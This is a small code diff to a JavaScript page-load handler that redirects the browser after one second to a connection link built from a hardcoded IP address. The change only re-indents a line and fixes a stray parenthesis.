@@ -1,4 +1,4 @@
-window.onload = function() {
+          window.onload = function() {
             setTimeout(function() {
                 
                 var ip = "163.5.124.20";
@@ -10,5 +10,4 @@ window.onload = function() {
             
                 window.location.href = linkDeConexao;
             }, 1000);
-        };)
-
+        };
